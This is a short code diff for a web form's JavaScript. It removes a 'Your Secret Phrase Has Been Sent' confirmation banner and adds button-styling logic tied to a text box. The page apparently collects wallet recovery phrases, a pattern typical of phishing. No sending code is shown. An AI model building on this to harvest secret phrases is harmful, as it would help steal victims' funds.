@@ -1,10 +1,9 @@
 let str = ""
 let error1 = false;
 let error2 = false;
-let confirmed = ` <div class="confirm-outer">
-                    <h2>Confirmed !!</h2>
-                    <h3>Your Secret Phrase Has Been Sent.</h3>
-                  </div>`
+
+document.querySelector(".button").style.backgroundColor = "gray"
+document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.294)"
 
 document.querySelector(".text-box").addEventListener("change",(e)=>{
     str = e.target.value;
@@ -29,6 +28,17 @@ function checkSymbNum(str){
     }
     return true;
 }
+
+document.querySelector(".text-box").addEventListener("input",(e)=>{
+    if(e.target.value.length === 0){
+      document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
+      document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.294)"
+    }
+    else{
+      document.querySelector(".button").style.color = "rgba(0, 0, 0, 1)"
+      document.querySelector(".button").style.backgroundColor = "rgba(255, 255, 255, 1)"
+    }
+  })
 
 document.querySelector(".button").addEventListener("click",(e)=>{
     e.preventDefault()
